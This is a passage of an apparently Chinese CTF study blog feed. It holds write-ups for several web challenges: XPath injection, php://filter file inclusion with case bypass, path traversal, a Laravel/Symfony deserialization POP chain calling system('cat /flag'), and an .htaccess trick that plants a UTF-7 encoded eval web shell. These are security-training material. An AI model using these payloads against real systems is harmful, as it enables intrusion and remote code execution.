src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826215028755.png"></p><p>/root/accounts的子节点</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826220116565.png"></p><p>就是这样一个一个跑就行了。</p><p>跑出来大概形式就是这样</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>accounts</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>gtfly123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>e10adc3949ba59abbe56e057f20f883e<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>adm1n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>cf7414b5bdb2e65ee43083f4ddbc4d9f<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>accounts</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还可以这种形式：</p><pre class="line-numbers language-none"><code class="language-none">substring(string(&#x2F;*[1]&#x2F;*[1]&#x2F;*[2]&#x2F;*[3]),1,1)&#x3D;&#39;a&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用adm1n@gtfly123登录</p><p>登录后发现base64，解码：flag is in /flag</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826220844743.png" alt="image-20210826220844743"></p><p>利用文件包含，提示nonono。有过滤，最后用大小写绕过，这要是不说，没有源码真想不到啊，尽量多做尝试吧。</p><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;pHp:&#x2F;&#x2F;filter&#x2F;convert.BAse64-encode&#x2F;resource&#x3D;&#x2F;flag?file&#x3D;pHp:&#x2F;&#x2F;FiltEr&#x2F;convert.BAse64-eNcode&#x2F;resource&#x3D;&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>试了下发现，<code>convert resource</code>不能修改大小写。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[网鼎杯 2020 半决赛]AliceWebsite</title>
      <link href="/p/74684521.html"/>
      <url>/p/74684521.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>给了三个页面的源码</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-AliceWebsite/image-20210826202704265.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>文件包含，签到题，没什么好说的。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;index.php?action&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[CISCN2019 总决赛 Day1 Web4]Laravel1</title>
      <link href="/p/3199619840.html"/>
      <url>/p/3199619840.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//backup in source.tar.gz</span><span class="token keyword">namespace</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Controllers</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token class-name class-name-fully-qualified type-declaration"><span class="token punctuation">\</span>Illuminate<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Request</span> <span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$payload</span><span class="token operator">=</span><span class="token variable">$request</span><span class="token operator">-></span><span class="token function">input</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"payload"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>看着主页代码，很明显是反序列化，先下载源码，看题目可得是Laravel框架，很有难度。</p><p>代码量太大，我还是老老实实跟着WP学8。</p><ul><li><p>思路</p><p>1、首先全局搜索<code>__destruct</code>这样的魔术方法</p><p>2、看看本类中有没有可控的命令执行命令，如果没有就找有没有那个方法可以调用其他类</p><p>3、然后全局搜索能利用的可控函数</p></li></ul><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Cache</span><span class="token punctuation">&#123;</span>    <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">CacheItem</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Cache<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Cache<span class="token punctuation">\</span>CacheItem</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">PhpArrayAdapter</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">TagAwareAdapter</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$deferred</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$pool</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">deferred</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flight'</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">CacheItem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pool</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PhpArrayAdapter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Cache<span class="token punctuation">\</span>Adapter<span class="token punctuation">\</span>TagAwareAdapter</span><span class="token punctuation">;</span>    <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TagAwareAdapter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-none"><code class="language-none">?payload&#x3D;O%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%22%3A2%3A%7Bs%3A57%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00deferred%22%3Ba%3A1%3A%7Bs%3A6%3A%22flight%22%3BO%3A33%3A%22Symfony%5CComponent%5CCache%5CCacheItem%22%3A0%3A%7B%7D%7Ds%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00pool%22%3BO%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CPhpArrayAdapter%22%3A1%3A%7Bs%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CPhpArrayAdapter%00file%22%3Bs%3A5%3A%22%2Fflag%22%3B%7D%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Cache<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">TagAwareAdapter</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$deferred</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pool</span> <span class="token operator">=</span> <span class="token variable">$x</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ProxyAdapter</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$setInnerItem</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Cache</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">CacheItem</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$innerItem</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cat /flag'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Cache<span class="token punctuation">\</span>Adapter<span class="token punctuation">\</span>TagAwareAdapter</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Cache<span class="token punctuation">\</span>Adapter<span class="token punctuation">\</span>ProxyAdapter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">deferred</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aa'</span><span class="token operator">=></span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Cache<span class="token punctuation">\</span>CacheItem</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-none"><code class="language-none">?payload&#x3D;O%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%22%3A2%3A%7Bs%3A8%3A%22deferred%22%3Ba%3A1%3A%7Bs%3A2%3A%22aa%22%3BO%3A33%3A%22Symfony%5CComponent%5CCache%5CCacheItem%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00innerItem%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7Ds%3A4%3A%22pool%22%3BO%3A44%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%22%3A1%3A%7Bs%3A15%3A%22%00%2A%00setInnerItem%22%3Bs%3A6%3A%22system%22%3B%7D%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><p>思路补全</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[极客大挑战 2020]Roamphp1-Welcome</title>
      <link href="/p/3383602229.html"/>
      <url>/p/3383602229.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>打开靶机</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Roamphp1-Welcome/image-20210826174233449.png"></p><p>还以为靶机坏了，结果是需要POST</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"HTTP/1.1 405 Method Not Allowed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'roam1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'roam2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'roam1'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'roam2'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'roam1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'roam2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// collect information from phpinfo!</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>签到题，没什么好说的。</p><pre class="line-numbers language-none"><code class="language-none">roam1[]&#x3D;1&amp;roam2[]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>搜下flag，结束。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[XNUCA2019Qualifier]EasyPHP</title>
      <link href="/p/1042722407.html"/>
      <url>/p/1042722407.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[htaccess|文件包含|尖括号绕过]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fl3g.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'on'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'html'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[^a-z\.]/"</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\nJust one chance"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>一开始想着真简单啊，直接写shell，</p><p>然后变成了字符串，</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XNUCA2019Qualifier-EasyPHP/image-20210825220859953.png"></p><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><blockquote><p>利用error_log写入log文件到<code>/tmp/fl3g.php</code>，再设置<code>include_path=/tmp</code>即可让index.php能够包含我们想要的文件。这里的报错可以通过设置<code>include_path</code>到一个不存在的文件夹即可触发包含时的报错，且include_path的值也会被输出到屏幕上。</p></blockquote><p>尝试上传.htaccess，但是在htaccess文件写入的时候，写入了一些混加的字符来打乱了我们的配置，可以利用注释符，以及转义，来进行绕过即<code>#\</code>，拼接完成过后就变成了<code>#\\nJust one chance</code> 不存在换行了。</p><p>error_log的内容默认是<code>htmlentities</code>的,我们无法插入类似<code>&lt;?php phpinfo();?&gt;</code>的payload，尝试设置编码来绕过限制。具体见<a href="https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack%202019/l33t-hoster/l33t-hoster.md">该wp</a>，还能绕过尖括号<code>&lt;</code>.</p><p>文件编码可以用notepad3或者<code>iconv 1.txt -f UTF-8 -t UTF-7 -o 2.txt</code></p><blockquote><p>.htaccess不支持多行注释且单行注释#必须在每行的开头</p></blockquote><p>所以.htaccess文件内容</p><pre class="line-numbers language-none"><code class="language-none">php_value include_path &quot;&#x2F;tmp&#x2F;xx&#x2F;+ADw?php die(eval($_GET[2]))+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;php_value error_reporting 32767php_value error_log &#x2F;tmp&#x2F;fl3g.php# \<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>include_path</strong>：include的路径，设置这个后，如果<code>include(fl3g.php)</code>就会尝试去包含<code>/tmp/fl3g.php</code>文件，没有则报错。</p><p><strong>error_log</strong>：将php运行报错的记录写到指定文件中</p><p><strong>error_reporting 